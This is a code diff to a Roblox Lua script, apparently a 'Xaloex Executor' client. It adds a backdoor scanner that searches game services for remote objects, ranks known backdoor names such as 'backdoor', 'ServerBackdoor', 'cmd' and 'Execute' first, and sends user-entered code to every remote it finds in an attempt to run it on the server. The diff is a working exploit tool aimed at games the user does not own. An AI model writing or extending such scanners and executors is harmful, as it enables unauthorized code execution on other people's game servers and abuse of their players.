@@ -617,6 +617,58 @@ ClearBtn.MouseButton1Click:Connect(function()
     CodeTextBox.Text = ""
 end)
 
+-- Helper to resolve paths like workspace.Folder.Model and destroy it locally (FE Simulation fallback)
+-- Helper to scan for all RemoteEvents and RemoteFunctions in common services (Backdoor Scanner)
+local function scanForBackdoorRemotes()
+    local found = {}
+    local prioritized = {}
+    
+    local scanServices = {
+        ReplicatedStorage,
+        game:GetService("JointsService"),
+        workspace,
+        game:GetService("Lighting"),
+        game:GetService("SoundService"),
+        game:GetService("LogService"),
+        game:GetService("ReplicatedFirst")
+    }
+    
+    local KNOWN_BACKDOORS = {
+        ["XaloexRemote"] = true,
+        ["Handshake"] = true,
+        ["backdoor"] = true,
+        ["ServerBackdoor"] = true,
+        ["\240\159\145\139"] = true, -- Wave emoji
+        ["hndshake"] = true,
+        ["req"] = true,
+        ["cmd"] = true,
+        ["Remote"] = true,
+        ["Execute"] = true,
+        ["JointsServiceRemote"] = true
+    }
+    
+    for _, service in ipairs(scanServices) do
+        pcall(function()
+            for _, child in ipairs(service:GetDescendants()) do
+                if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
+                    if KNOWN_BACKDOORS[child.Name] then
+                        table.insert(prioritized, child)
+                    else
+                        table.insert(found, child)
+                    end
+                end
+            end
+        end)
+    end
+    
+    -- Merge prioritized remotes at the beginning
+    for i = #found, 1, -1 do
+        table.insert(prioritized, found[i])
+    end
+    
+    return prioritized
+end
+
 -- Core Code Execution trigger
 ExecuteBtn.MouseButton1Click:Connect(function()
     local code = CodeTextBox.Text
@@ -624,22 +676,43 @@ ExecuteBtn.MouseButton1Click:Connect(function()
     
     runShimmer()
     
-    local remote = ReplicatedStorage:FindFirstChild("XaloexRemote")
-    if remote and remote:IsA("RemoteFunction") then
-        task.spawn(function()
-            local success, response = invokeServerWithTimeout(remote, 3.5, code)
-            
-            if success and response == true then
-                print("Server Response: Yeah")
-            else
-                print("Server Response: Not")
-            end
-        end)
-    else
-        -- Remote event missing or not responding
-        warn("Xaloex Executor [Help]: Server script is not installed or running. The client is reporting 'Not' because 'XaloexRemote' was not found in ReplicatedStorage.")
+    -- Real Server-Side backdoor scan
+    local remotes = scanForBackdoorRemotes()
+    
+    if #remotes == 0 then
         print("Server Response: Not")
+        return
     end
+    
+    task.spawn(function()
+        local executionSuccess = false
+        
+        for _, remote in ipairs(remotes) do
+            if remote:IsA("RemoteFunction") then
+                -- Invoke server with timeout to avoid freezing threads
+                local success, response = invokeServerWithTimeout(remote, 1.5, code)
+                if success and response == true then
+                    executionSuccess = true
+                    break
+                end
+            elseif remote:IsA("RemoteEvent") then
+                -- Fire the RemoteEvent with the payload. Since events are asynchronous and do not return values,
+                -- if the client successfully transmits the invocation without errors, it is triggered.
+                local fireSuccess = pcall(function()
+                    remote:FireServer(code)
+                end)
+                if fireSuccess then
+                    executionSuccess = true
+                end
+            end
+        end
+        
+        if executionSuccess then
+            print("Server Response: Yeah")
+        else
+            print("Server Response: Not")
+        end
+    end)
 end)
 
 
